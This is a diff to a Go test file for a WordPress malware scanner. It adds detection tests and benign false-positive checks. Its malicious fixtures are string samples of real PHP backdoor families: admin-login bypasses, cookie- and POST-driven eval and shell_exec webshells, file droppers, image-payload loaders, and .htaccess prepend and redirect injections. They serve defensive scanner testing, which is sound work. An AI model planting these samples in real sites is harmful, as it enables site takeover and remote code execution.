@@ -2,6 +2,7 @@ package scan
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/sha256"
 	"encoding/hex"
 	"os"
@@ -144,6 +145,27 @@ func TestEngineSemantics(t *testing.T) {
 	}
 }
 
+func TestLargeFileTailIsScanned(t *testing.T) {
+	rs := &RuleSet{Version: 2, Rules: []Rule{{ID: "eval", Name: "eval", Severity: "critical", Patterns: []string{`eval\s*\(\s*base64_decode`}}}}
+	s := New(rs, Options{Workers: 1, MaxBytes: 64 * 1024, NoDecode: true})
+	dir := t.TempDir()
+	big := append(bytes.Repeat([]byte("// filler line of harmless text\n"), 8000), []byte("\n<?php eval(base64_decode('x'));\n")...)
+	p := filepath.Join(dir, "big.php")
+	if err := os.WriteFile(p, big, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	f, err := s.ScanFile(p, "plugins/a/big.php")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(f) != 1 || f[0].RuleID != "eval" {
+		t.Fatalf("payload past MaxBytes not found: %v", ids(f))
+	}
+	if f[0].SHA256 != sum(string(big)) {
+		t.Error("hash must cover the whole file")
+	}
+}
+
 func TestV1RuleFileStillLoads(t *testing.T) {
 	rs, err := ParseRuleSet([]byte(`[{"id":"a","name":"A","severity":"high","patterns":["foo"],"exclude_paths":["x/"]}]`))
 	if err != nil {
@@ -151,6 +173,17 @@ func TestV1RuleFileStillLoads(t *testing.T) {
 	}
 	if rs.Version != 1 || len(rs.Rules) != 1 || rs.Rules[0].ExcludePaths[0] != "x/" {
 		t.Fatalf("v1 parse: %+v", rs)
+	}
+}
+
+func TestExtOf(t *testing.T) {
+	for name, want := range map[string]string{
+		"a/shell.php.bak": ".php", "x.php.suspected": ".php", "y.PHTML": ".phtml", "z.js": ".js",
+		"w.bak": ".bak", "noext": "", "dir.php/readme.txt": ".txt",
+	} {
+		if got := ExtOf(name); got != want {
+			t.Errorf("ExtOf(%q) = %q, want %q", name, got, want)
+		}
 	}
 }
 
@@ -253,6 +286,36 @@ func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
 		"<?php ?><a class=\"skip-link screen-reader-text\" href=\"#content\">Skip</a><style>.screen-reader-text{position:absolute;left:-9999px}</style>\n")
 	write(t, dir, "plugins/capability-manager-enhanced/includes/roles/class/class-pp-roles-actions.php",
 		"<?php\n$level = ($_REQUEST['current_role'] === 'administrator') ? 10 : absint($_REQUEST['role_level']);\n$role = get_role('administrator'); $user->set_role($_REQUEST['current_role']); wp_set_current_user($id);\n")
+	write(t, dir, "plugins/beehive-analytics/dependencies/vendor/google/auth/src/FetchAuthTokenCache.php",
+		"<?php\n/**\n * Require use of OpenSSL for local signing. Does nothing else.\n * Include the cache. REQUIRED for Eval mode.\n */\nrequire_once __DIR__ . '/x.php';\n")
+	write(t, dir, "plugins/wordpress-seo/src/llms-txt/handler.php",
+		"<?php\n$bom = \"\\xEF\\xBB\\xBF\";\n$table = \"\\x20\\x65\\x69\\x61\\x73\\x6E\\x74\\x72\\x6F\\x6C\\x75\\x64\";\n")
+	write(t, dir, "themes/twentytwentyone/functions.php",
+		"<?php\n$black = '#000000'; $dark_gray = '#28303D'; $gray = '#39414D'; $green = '#D1E4DD'; $blue = '#D1DFE4'; $purple = '#D1D1E4'; $red = '#E4D1D1'; $orange = '#E4DAD1'; $yellow = '#EEEADD';\n")
+	write(t, dir, "wp-content/uploads/.htaccess",
+		"# Protect uploads\n<FilesMatch \"\\.(php|phtml)$\">\nOrder allow,deny\nDeny from all\n</FilesMatch>\n")
+	write(t, dir, ".htaccess",
+		"# BEGIN WordPress\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\nRewriteCond %{HTTP_HOST} ^www\\.example\\.com$ [NC]\nRewriteRule ^(.*)$ https://example.com/$1 [R=301,L]\n")
+	write(t, dir, "plugins/code-snippets/dist/edit.css",
+		".cm-php { color: #c00 } /* highlights <?php tags in the editor */\n")
+	write(t, dir, "plugins/code-snippets/dist/manage.js",
+		"var t = '<?php'; if (code.indexOf('<?php') === 0) { strip(); }\n")
+	write(t, dir, "plugins/fusion-builder/inc/lib/inc/redux/import_export.php",
+		"<?php\nif ( $_COOKIE['fusionredux_current_tab'] == 'import_export_default' ) { $tab = 'import'; }\nif ( $_POST['display_username_for'] == 'current_user' ) { $u = wp_get_current_user(); }\n")
+	write(t, dir, "plugins/gravityformssignature/class-gf-signature.php",
+		"<?php\nif ( substr( $data, 0, 8 ) === \"\\x89PNG\\x0d\\x0a\\x1a\\x0a\" ) { $type = 'png'; }\n")
+	write(t, dir, "plugins/wordfence/vendor/wordfence/wf-waf/src/lib/parser/sqli.php",
+		"<?php\n$keywords = array('REQUIRE', 'SELECT', 'UNION');\n")
+	write(t, dir, "plugins/wp-smush-pro/core/class-image.php",
+		"<?php\n$data = file_get_contents( $path . '/thumb.jpg' ); $img = imagecreatefromjpeg( $path . '/thumb.jpg' ); $exif = exif_read_data( $file ); if ( ! empty( $exif['Orientation'] ) ) { $img = imagerotate( $img, 180, 0 ); }\n")
+	write(t, dir, "themes/t/inc/template-tags.php",
+		"<?php\nrequire_once get_template_directory() . '/inc/customizer.php';\ninclude locate_template( 'template-parts/content.php' );\n$css = file_get_contents( get_template_directory() . '/style.css' );\n")
+	write(t, dir, "plugins/hub-core/extras/redux-framework/ReduxCore/inc/fields/typography/field_typography.json",
+		"<?php exit(); ?>\n{\"fonts\": {\"Arial\": \"sans-serif\"}}\n")
+	write(t, dir, "plugins/trx_addons/components/theme-panel/importer/export/layouts.txt",
+		"<?php exit; ?>\na:1:{s:6:\"layout\";s:4:\"wide\";}\n")
+	write(t, dir, "themes/oceanwp/woocommerce/share.php",
+		"<?Php oceanwp_icon( 'facebook' ); ?></a>\n")
 	write(t, dir, "plugins/buddyboss-platform/bp-core/admin/classes/class-bb-support-access.php",
 		"<?php\n$id = wp_insert_user( array( 'user_login' => self::USER_LOGIN, 'user_email' => self::USER_EMAIL, 'role' => 'administrator' ) );\n")
 	res := s.ScanDir(dir)
@@ -269,12 +332,52 @@ func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
 	s := shippedRules(t)
 	dir := t.TempDir()
 	cases := map[string]struct{ content, rule string }{
-		"themes/x/vendor/lib/Header.php": {"<?php\nclass Header {}\n?><div style=\"position:absolute; left:-2083px; top:-2274px;\"><a href=\"http://example.invalid/dofa/pharmacy-express\">pharmacy express</a><a href=\"http://example.invalid/dofa/super-viagra-active\">super viagra active</a></div>\n", "hidden-pharma-links"},
-		"themes/x/footer.php":            {"<?php get_footer(); ?>\n<div style=\"position:absolute; left:-9999px;\"><a href=\"https://example.invalid/a\">one</a><a href=\"https://example.invalid/b\">two</a><a href=\"https://example.invalid/c\">three</a></div>\n", "offscreen-link-block"},
-		"mu-plugins/key.php":             {"<?php\n/**\n * Plugin Name: WordPress\n * Description: Auto-update request.\n * Version: 3.3\n * Author: WordPress\n */\ndefined('ABSPATH') || exit;\ndefine('WPK_SECRET_KEY', 'devupdate');\nadd_action('init', function () {\n    if (!isset($_GET['dev']) || $_GET['dev'] !== WPK_SECRET_KEY) { return; }\n    global $wpdb;\n    $admin_id = $wpdb->get_var(\"SELECT u.ID FROM {$wpdb->users} u INNER JOIN {$wpdb->usermeta} m ON u.ID = m.user_id WHERE m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%administrator%' LIMIT 1\");\n    wp_set_auth_cookie($admin_id, true);\n});\n", "fake-wordpress-plugin-header"},
-		"mu-plugins/key2.php":            {"<?php\ndefine('WPK_SECRET_KEY', 'devupdate');\nif ($_GET['dev'] !== WPK_SECRET_KEY) { exit; }\n$users = get_users(array('role' => 'administrator'));\nwp_set_auth_cookie($users[0]->ID);\n", "secret-key-admin-access"},
-		"themes/x/pages/load.php":        {"<?php echo file_get_contents($_GET['url']); ?>\n", "request-controlled-fetch"},
-		"themes/x/js.php":                {"<?php print(\"upload::http://nothing\");", "get-nothing-marker"},
+		"themes/x/vendor/lib/Header.php":                    {"<?php\nclass Header {}\n?><div style=\"position:absolute; left:-2083px; top:-2274px;\"><a href=\"http://example.invalid/dofa/pharmacy-express\">pharmacy express</a><a href=\"http://example.invalid/dofa/super-viagra-active\">super viagra active</a></div>\n", "hidden-pharma-links"},
+		"themes/x/footer.php":                               {"<?php get_footer(); ?>\n<div style=\"position:absolute; left:-9999px;\"><a href=\"https://example.invalid/a\">one</a><a href=\"https://example.invalid/b\">two</a><a href=\"https://example.invalid/c\">three</a></div>\n", "offscreen-link-block"},
+		"mu-plugins/key.php":                                {"<?php\n/**\n * Plugin Name: WordPress\n * Description: Auto-update request.\n * Version: 3.3\n * Author: WordPress\n */\ndefined('ABSPATH') || exit;\ndefine('WPK_SECRET_KEY', 'devupdate');\nadd_action('init', function () {\n    if (!isset($_GET['dev']) || $_GET['dev'] !== WPK_SECRET_KEY) { return; }\n    global $wpdb;\n    $admin_id = $wpdb->get_var(\"SELECT u.ID FROM {$wpdb->users} u INNER JOIN {$wpdb->usermeta} m ON u.ID = m.user_id WHERE m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%administrator%' LIMIT 1\");\n    wp_set_auth_cookie($admin_id, true);\n});\n", "fake-wordpress-plugin-header"},
+		"mu-plugins/key2.php":                               {"<?php\ndefine('WPK_SECRET_KEY', 'devupdate');\nif ($_GET['dev'] !== WPK_SECRET_KEY) { exit; }\n$users = get_users(array('role' => 'administrator'));\nwp_set_auth_cookie($users[0]->ID);\n", "secret-key-admin-access"},
+		"themes/x/pages/load.php":                           {"<?php echo file_get_contents($_GET['url']); ?>\n", "request-controlled-fetch"},
+		"themes/x/js.php":                                   {"<?php print(\"upload::http://nothing\");", "get-nothing-marker"},
+		"plugins/a/bottom-1778612994.php":                   {"<!--5MVGq9LC--><?phpif(count($_REQUEST) > 0 && isset($_REQUEST[\"\\x65le\\x6D\"])){$holder = array_filter([\"/tmp\"]);}", "escaped-superglobal-key"},
+		"plugins/a/306.min.php":                             {"<?php /* E3 */ $jfF='IE'; /* 3f2X8QktRrV3i */ $mV4jko5='OK'; /* a */ $uu7L='O'; /* xVAr3I */ $aF4g=${$qrP7U.$uu7L.$mV4jko5.$jfF}; /* UurWpzFdhhe */ if(isset($aF4g['Wozj'])){eVAL($aF4g['Wozj']);}", "mixed-case-keyword"},
+		"plugins/a/db.php":                                  {"<?php $f='abc';$t='cba';for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}", "substitution-cipher-decoder"},
+		"plugins/a/index.php":                               {"<?php /** H3K | Tiny File Manager */ $copy_to = fm_clean_path($_POST['to']);", "tiny-file-manager"},
+		"themes/t/custom-functions.php":                     {"<?php $x = explode(chr((292-248)),'8811,64,8190,63,6142,30,5248,23,9512,68,9469,43,7867,44,8253,42,359,34,7687,22,1838,24');", "chr-arith-explode"},
+		"plugins/a/MessageCard.php":                         {"<?php foreach ($pills as $k) { $pill = $pills[$k]; echo $pill; }", "pills-spam-array"},
+		"plugins/a/repair_backup.php":                       {"<?php $currency = 'g,S)MH'; $invoke='co6I_';$eye='e';$cloture = '?_c';$dashing = 'r';$imperishable= 's';$freewheel ='a;dgLOs_'; $completion ='=';$fr0st='v';$cantors = 'aN)';", "dictionary-word-obfuscation"},
+		"themes/t/easypost.php":                             {"<?php $cfg = '{\"token_id\":\"ep_28e0dc8a825c43799a06a8e25c25d054\",\"token_verifier\":\"v1:ae2afe6c3d4870f8936cc8216d994168:c3959f407c\"}';", "easypost-toolkit"},
+		"uploads/css41.php":                                 {"<?php $qxnc=$_COOKIE;$tuw=$qxnc[rrti];if($tuw){ $xhdpw=$tuw($qxnc[nqcl]);$phkab=$tuw($qxnc[beic]);$kjrti=$xhdpw(\"\",$phkab);$kjrti();}", "cookie-callable-backdoor"},
+		"uploads/alias.php":                                 {"<?php $GLOBALS['k8371'] = 'abcdefghijklmnopqrstuvwxyz'; $GLOBALS[$GLOBALS['k8371'][53].$GLOBALS['k8371'][41].$GLOBALS['k8371'][19].$GLOBALS['k8371'][60]] = 1;", "globals-indexed-obfuscation"},
+		"uploads/786131cc.php":                              {"<?php if(@is_file(\"/www/site/public/wp-content/.786131cc.php\"))@include_once \"/www/site/public/wp-content/.786131cc.php\";", "hidden-dotfile-include"},
+		"uploads/4O4.php":                                   {"<?php $a = pack('H*', '706'.'173'.'736'); eval($a);", "pack-hex-concat"},
+		"uploads/qwRBdotoo.php":                             {"<?php $file_content = stripslashes($_POST['file']); $filename = 'bd' . date('YmdHis') . '.php'; file_put_contents(__DIR__ . '/' . $filename, $file_content); header('Content-Type: text/plain');", "php-dropper-write"},
+		"uploads/2024/01/pic.php":                           {"\xff\xd8\xff\xe0\x00\x10JFIF\x00 binary bytes <?php if (file_put_contents('x.php', $_POST['c'])) {}", "image-header-with-php"},
+		"uploads/post.php":                                  {"<?php $key = hex2bin($_REQUEST[\"hld\"]);", "hex2bin-request"},
+		"uploads/405.phtml":                                 {"<?php $fnct = \"fu\".\"nc\".\"tion\".\"_exi\".\"sts\"; $e = \"ev\".\"al\";", "split-string-function-name"},
+		"uploads/index2.php":                                {"<?php $_________=\"\"; $_________.=\"f\";$_________.=\"_\";$________.=\"o\";$_______.=\"p\";", "underscore-variable-obfuscation"},
+		"uploads/wp-incha.php":                              {"<?php /** Front to the WordPress application. */@/* * */include_once/* which does and tells */'wp-includes/x.php';", "include-wrapped-in-comments"},
+		"uploads/wp-blog.php":                               {"<?php $_REQUEST = array_merge($_GET, $_POST, $_COOKIE); $f = \"create\" . \"_\" . \"function\";", "request-merge-into-request"},
+		"uploads/wp-stats.php":                              {"<?php define('_JEXEC', '07b0418e1119091a9281ac5614cb9d776a85f21434408cdbbe26ca43b70618af81fecca59e592af986dae8dc8de4d1e52d');", "fake-joomla-jexec"},
+		"uploads/cache.php":                                 {"<?php /*SmEvK_PaThAn Shell v3 Coded by Kashif Khan*/ $smevk = \"PD9waHAK\"; eval(\"?>\".(base64_decode($smevk)));", "webshell-names"},
+		"uploads/shell.php.suspected":                       {"<?php eval(base64_decode($_POST['x']));", "eval-decode-chain"},
+		"themes/x/sky.php":                                  {"<?php if (strpos($_SERVER['REQUEST_URI'], '?sky') === false) { http_response_code(404); exit; } $url = 'https://example.invalid/Nathan/alfa.txt';", "uri-key-gate-fake-404"},
+		"wp-includes/class-wp-locale-helper.php":            {"<?php if(isset($_GET['_chk'])){ $d=base64_decode(isset($_POST['d'])?$_POST['d']:''); if($d){echo@shell_exec($d.' 2>&1');}exit;}", "conditional-request-base64-shell"},
+		"uploads/2018/qwRBdotoo.php":                        {"<?php $custom_key = isset($_POST['ximqlz']) ? stripslashes($_POST['ximqlz']) : ''; if($custom_key === 'PtXe*JMQ%jT2HS!BSRc4a$$^'){ $filename = 'bd' . date('YmdHis') . '.php'; $file_path = __DIR__ . '/' . $filename; file_put_contents($file_path, $file_content); }", "php-dropper-write"},
+		"plugins/fix/up.php":                                {"<?php if(isset($_POST[\"submit\"])) { if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], './' . basename($_FILES[\"fileToUpload\"][\"name\"]))) { echo 'ok'; } }", "bare-upload-form"},
+		"uploads/aioseo/logs/mlpghswk.php":                  {"<?php $above_midpoint_count = 'uv298l1'; $is_last_exporter = 'btdjq2'; $registration_log = 'gkjsl'; $searches = 'smy2pbogk';\nfunction column_comment($ts_prefix_len){ $allowSCMPXextended = 'zhstda9x'; include($ts_prefix_len); }", "include-parameter-with-junk-vars"},
+		"plugins/scanner-helper-pro/scanner-helper-pro.php": {"<?php $k='mDhr9QUcAsFA'; add_filter(d(hex2bin('1f2e3d4c5b6a')), 'a'); add_filter(d(hex2bin('a1b2c3d4e5f6')), 'b'); $u = d(hex2bin('00112233445566')); $v = d(hex2bin('ffeeddccbbaa99'));", "hex2bin-literal-obfuscation"},
+		"plugins/seocore/layout.css":                        {"<?php ?>", "php-stub-asset"},
+		"plugins/x/FrmViewsCategory.php":                    {"<?PHp     //J+76d|sWBCM[kLO5VH1@g\" ` #<^_X)kp@Pm4(1XVmE#=ZZe/*J?aWNp1dl66lyL#\\`GTEgPy3[FW:*///0X=lq|MJ&9<Gj+[s<5J*ZNG5).\"%\\p\"mJ?[<<)gCC%j/0G#L\\N(//M'.P,kB.YlN5*k?r0bwzq(CuU D-8A-fH;8U'Zd`H4vR!6F1y?-reqUirE_oNcE  //OgP<q&YcZS)WCSo]ok~C\\d|b# DH589d!i\"sp\\WL1a$T5~\n'x.php';", "mixed-case-keyword"},
+		"plugins/wp-lastweets/vendor/composer/autoload_erlistrc-8Nw6M9.php": {"<?php class code_auth { function code2leng($start, &$data, &$data_long){ $tmp = unpack('N*', $data); foreach ($tmp as $v) $data_long[$start++] = $v; return $start; } function uncode($enc){ $keyone = $_SERVER['HTTP_USER_AGENT']; if(preg_match('/WebKit\\/(.*?) \\(KHTML/is',$keyone,$src)){ $key = str_replace('.','aGcE',$src[1]); }else{ die(); } return $key; } }", "ua-keyed-decoder"},
+		"uploads/loader1.php":            {"<?php include('../uploads/2024/03/banner.jpg'); ?>", "include-non-php-file"},
+		"uploads/loader2.php":            {"<?php $img = file_get_contents(__DIR__ . '/logo.png'); $code = base64_decode(substr($img, strpos($img, '//'))); eval($code);", "image-payload-loader"},
+		"uploads/loader3.php":            {"<?php $e = exif_read_data('photo.jpg'); eval(base64_decode($e['Comment']));", "image-payload-loader"},
+		"uploads/loader4.php":            {"<?php $fp = fopen(__FILE__, 'r'); fseek($fp, __COMPILER_HALT_OFFSET__); $p = stream_get_contents($fp); eval(gzinflate(base64_decode($p))); __halt_compiler();", "self-payload-halt-compiler"},
+		"uploads/loader5.php":            {"<?php include('data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7');", "data-uri-php-include"},
+		".htaccess":                      {"# BEGIN WordPress\nphp_value auto_prepend_file /home/u/public_html/wp-includes/.x.php\n", "htaccess-auto-prepend"},
+		"uploads/.htaccess":              {"<FilesMatch \"\\.(jpg|png)$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\nAddType application/x-httpd-php .jpg\n", "htaccess-php-in-images"},
+		"themes/t/.htaccess":             {"RewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (google|bing|yahoo) [NC]\nRewriteCond %{REQUEST_URI} !admin\nRewriteRule ^(.*)$ http://example.invalid/pharma/$1 [R=301,L]\n", "htaccess-cloaked-redirect"},
+		"uploads/wp-security-helper.php": {"<?php add_action(\"\\160\\162\\x65\\137\\147\\145\\x74\\137\\x75\\163\\145\\162\\163\", 'hide');", "hidden-user-query-hook-escaped"},
 	}
 	for rel, c := range cases {
 		write(t, dir, rel, c.content)
